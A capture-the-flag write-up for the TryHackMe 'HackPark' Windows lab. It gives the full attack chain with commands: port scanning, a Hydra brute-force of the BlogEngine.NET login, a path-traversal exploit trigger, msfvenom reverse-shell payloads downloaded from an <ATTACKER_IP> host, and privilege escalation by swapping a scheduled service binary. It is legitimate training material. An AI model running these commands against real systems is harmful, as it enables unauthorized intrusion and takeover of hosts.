# HackPark – Red Team Write-Up (Medium)

**Author:** Omar Taisir Abu Zahra  
**Platform:** TryHackMe  
**Target IP:** 10.113.166.205  
**Difficulty:** Medium  

---

##  Overview

This engagement simulates a real-world attack against a Windows server, covering:

- Network reconnaissance  
- Web application enumeration  
- Credential brute-forcing  
- Public exploit execution  
- Privilege escalation  

---

##  Phase 1 – Reconnaissance

### Full Port Scan

```bash
nmap -T4 -p- -Pn 10.113.166.205
Service Enumeration
nmap -sV -sC -A -Pn 10.113.166.205
Key Findings
80/tcp → Microsoft IIS 8.5
3389/tcp → RDP
robots.txt revealed hidden directories
Hostname: HACKPARK
```
### MITRE ATT&CK Mapping
T1046 – Network Service Discovery
T1018 – Remote System Discovery

##  Phase 2 – Web Enumeration
```bash
Access Web Server
http://10.113.166.205
OSINT (Image Analysis)
Extracted image from homepage
Reverse image search performed
Clown identity discovered (hidden)
Directory Enumeration
gobuster dir -u http://10.113.166.205 \
-w /usr/share/wordlists/dirb/common.txt -t 50
robots.txt
curl http://10.113.166.205/robots.txt
Findings
/Account/
/admin/
/archive/
```
## MITRE ATT&CK Mapping
T1083 – File and Directory Discovery
T1595 – Active Scanning
## Phase 3 – Credential Access
```bash
Login Portal
http://10.113.166.205/Account/login.aspx?ReturnURL=/admin/
Identify Request Type
curl -s http://10.113.166.205/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
Method: POST
Brute Force with Hydra
hydra -f -l admin \
-P /usr/share/wordlists/rockyou.txt \
10.113.166.205 http-post-form \
"/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=...&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^:Login failed"
Result
Valid credentials obtained (hidden)
```
## MITRE ATT&CK Mapping
T1110 – Brute Force
T1078 – Valid Accounts
## Phase 4 – Exploitation
```bash
Application Identification
CMS: BlogEngine.NET
Version discovered via admin panel
Version identified (hidden)
Vulnerability Research
Public exploit identified
CVE identified (hidden)
Exploit Execution
rlwrap nc -nlvp 1234

Trigger:

http://10.113.166.205/?theme=../../App_Data/files
Initial Access
whoami
Web server context obtained (hidden)
```
## MITRE ATT&CK Mapping
T1190 – Exploit Public-Facing Application
T1059 – Command and Scripting Interpreter
## Phase 5 – Shell Stabilization
```bash
Generate Payload
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=2345 -f exe -o revshell.exe
Transfer Payload
powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/revshell.exe' -OutFile 'C:\Windows\Temp\revshell.exe'"
Start Listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 2345
run
Execute Payload
C:\Windows\Temp\revshell.exe
```
## MITRE ATT&CK Mapping
T1105 – Ingress Tool Transfer
T1055 – Process Injection
## Phase 6 – Enumeration
```bash
System Info
sysinfo
OS details identified (hidden)
Process Enumeration
ps
Suspicious service discovered (hidden)
```
## MITRE ATT&CK Mapping
T1082 – System Information Discovery
T1057 – Process Discovery

## Phase 7 – Privilege Escalation
```bash
Navigate to Service Directory
cd "C:\Program Files (x86)\SystemScheduler\"
Log Analysis
type LogFile.txt
Binary executed periodically with elevated privileges (hidden)
Exploitation

Generate payload:

msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=3456 -f exe -o Message.exe

Replace binary:

powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
Result
getuid
Administrator access obtained (hidden)
```
## MITRE ATT&CK Mapping
T1574.010 – Hijack Execution Flow
T1068 – Exploitation for Privilege Escalation
## Phase 8 – Flags
```bash
User Flag
type C:\Users\jeff\Desktop\user.txt
FLAG{********************************}
Root Flag
type C:\Users\Administrator\Desktop\root.txt
FLAG{********************************}
```